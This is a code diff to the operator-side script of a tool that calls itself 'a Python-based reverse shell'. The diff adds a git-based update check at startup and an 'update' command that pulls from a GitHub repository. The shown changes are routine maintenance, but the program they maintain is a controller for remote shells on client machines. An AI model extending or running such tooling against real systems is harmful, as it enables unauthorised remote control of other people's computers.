@@ -5,6 +5,7 @@ import os
 import threading
 import urllib.parse
 from http.server import BaseHTTPRequestHandler, HTTPServer
+import subprocess
 
 SEPARATOR = "<sep>"  # For separating filename and filesize
 HelpList = ["This is a List of all available commands", "--------------------------------------------------",
@@ -166,7 +167,6 @@ def StartServer(host='127.0.0.1', port=5005, output_folder='received_files'):
 
 
 # Support
-
 def start_file_server_in_thread():
     server_thread = threading.Thread(target=StartServer, args=(SERVER_HOST, 5005), daemon=True)
     server_thread.start()
@@ -181,6 +181,44 @@ def RemoveInactiveClients():
             clients.remove(client)
             s += 1
     print(f"\n{TimeStamp()} Removed {s} inactive client(s) from the list.")
+
+def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
+    original_cwd = os.getcwd()
+    os.chdir(repo_path)
+
+    try:
+        # Fetch latest data from remote
+        subprocess.run(['git', 'fetch'], check=True, stdout=subprocess.DEVNULL)
+
+        # Get local and remote commit hashes
+        local_commit = subprocess.check_output(['git', 'rev-parse', branch]).strip()
+        remote_commit = subprocess.check_output(['git', 'rev-parse', f'origin/{branch}']).strip()
+
+        # Get local version
+        local_version = "unknown"
+        if os.path.exists(version_file):
+            with open(version_file) as f:
+                local_version = f.read().strip()
+
+        # Get remote version
+        try:
+            remote_version = subprocess.check_output(
+                ['git', 'show', f'origin/{branch}:{version_file}']
+            ).decode().strip()
+        except subprocess.CalledProcessError:
+            remote_version = "unknown"
+
+        # Compare
+        if local_commit != remote_commit:
+            print(f"[!] Update available. {local_version} > {remote_version}")
+        else:
+            print(f"[✓] You're up to date. Version: {local_version}")
+
+    except subprocess.CalledProcessError as e:
+        print(f"[X] Git error: {e}")
+    finally:
+        os.chdir(original_cwd)
+
 
 
 
@@ -197,7 +235,7 @@ print(f"QRS Started on {SERVER_HOST}:{SERVER_PORT} at {TimeStamp()}")
 print(f"Welcome to QRS a Python-based reverse shell!")
 print("Type 'help' to see the available commands.")
 print("--------------------------------------------------")
-
+CheckForUpdates()
 while True:
     cmd = input(f"{TimeStamp()} $> ")
     if not cmd.strip():
@@ -216,6 +254,14 @@ while True:
             print(f"{TimeStamp()} Found {len(clients)} connection(s):")
             for client in clients:
                 print(f"[+] {client.__str__()}")
+    if cmd.lower() == "update":
+        print(f"{TimeStamp()} Updating QRS...")
+        try:
+            subprocess.run("git pull https://github.com/the-real-N0NAME/QRS.git", shell=True, check=True)
+            print(f"{TimeStamp()} QRS updated successfully.")
+            exit(0)
+        except subprocess.CalledProcessError as e:
+            print(f"[!] Error occurred while updating QRS: {e.stderr}")
 
     SplitedCMD = cmd.split()
     if SplitedCMD[0].lower() == "clear":
